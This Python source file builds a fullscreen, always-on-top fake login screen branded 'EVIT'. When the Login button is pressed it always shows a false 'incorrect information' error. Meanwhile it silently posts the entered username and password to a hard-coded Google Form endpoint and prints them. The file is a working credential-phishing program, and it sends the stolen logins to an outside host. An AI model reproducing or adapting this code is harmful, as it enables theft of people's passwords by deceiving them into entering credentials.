import time
from time import sleep
import sys
import os
import customtkinter as ctk
from PIL import Image
import requests

ctk.set_appearance_mode("light")
ctk.set_default_color_theme("blue")

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except AttributeError:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)


class helloguys(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("EVIT")

        logo_path = resource_path(r"resources\evitlogo.png")

        long_logo = ctk.CTkImage(
            light_image=Image.open(logo_path),
            dark_image=Image.open(logo_path),
            size=(512, 293)
        )


        screen_width = self.winfo_screenwidth()
        screen_height = self.winfo_screenheight()

        self.attributes('-fullscreen', True)

        self.resizable(False, False)
        self.geometry(f"{screen_width}x{screen_height}")

        self.configure(fg_color="#3b1745")

        self.attributes('-topmost', True)

        spacer = ctk.CTkLabel(self, text="", height=100)
        spacer.pack(side="top", fill="x")

        self.logolabel = ctk.CTkLabel(self, image=long_logo, text="")
        self.logolabel.pack(side="top", fill="x")

        spacer = ctk.CTkLabel(self, text="", height=150)
        spacer.pack(side="top", fill="x")

        self.logincontainer = ctk.CTkFrame(self,corner_radius=20 ,width=500, height=325)
        self.logincontainer.pack(side="top")

        self.loginframe = ctk.CTkFrame(self.logincontainer,corner_radius=20 ,width=500, height=220)
        self.loginframe.pack(padx=25, pady=25)

        self.usernamelabel = ctk.CTkLabel(self.loginframe, text="Enter Username:", font=("Arial", 15))
        self.usernamelabel.place(relx=0.2, y=30)

        self.usernameentry = ctk.CTkEntry(self.loginframe, font=("Arial", 15))
        self.usernameentry.place(relx=0.45, y=30)

        self.passwordlabel = ctk.CTkLabel(self.loginframe, text="Enter Password:", font=("Arial", 15))
        self.passwordlabel.place(relx=0.2, y=90)

        self.passwordentry = ctk.CTkEntry(self.loginframe, font=("Arial", 15))
        self.passwordentry.place(relx=0.45, y=90)

        self.loginbutton = ctk.CTkButton(self.loginframe, text="Login", fg_color="#663075", width=150, height=40, font=("Arial", 17), command=self.error)
        self.loginbutton.place(relx=0.36, y=155)

        spacer = ctk.CTkLabel(self, text="", height=15)
        spacer.pack(side="top", fill="x")

    def _destroy_error_elements(self, a, b):
        if a:
            a.destroy()
        if b:
            b.destroy()

    def error(self):

        errormessage = ctk.CTkLabel(self, text="ERROR: Incorrect Information Inputted, Try Again.", text_color="red",height=20)
        errormessage.pack(side="top", fill="x", pady=2)

        sleep(0.4)
        self.after(2000, lambda: self._destroy_error_elements(errormessage,errormessage))

        self.send_login_completion_data(self.usernameentry.get(), self.passwordentry.get())

    def send_login_completion_data(self, username, password):
        GOOGLE_FORM_URL = "https://docs.google.com/forms/d/e/1FAIpQLScsXoRYhilICdgyRckhJoIlglTZGMJh46ed2Ny-yVGb5Cv8ng/formResponse"

        # --- USE THE KEYS YOU FOUND IN THE PAYLOAD TAB ---
        USERNAME_FIELD = "entry.366340186"
        PASS_FIELD = "entry.1099239395"
        # Package the data exactly as the Google Form expects it
        form_data = {
            USERNAME_FIELD: username,
            PASS_FIELD: password
        }

        try:
            # Send the POST request to the Google Form endpoint
            response = requests.post(GOOGLE_FORM_URL, data=form_data)
            response.raise_for_status()  # Check for errors

            print(f"Successfully submitted data for {username}, {password}")

        except requests.exceptions.RequestException as e:
            print(f"Failed to submit data: {e}")

if __name__ == '__main__':
    app = helloguys()
    app.mainloop()

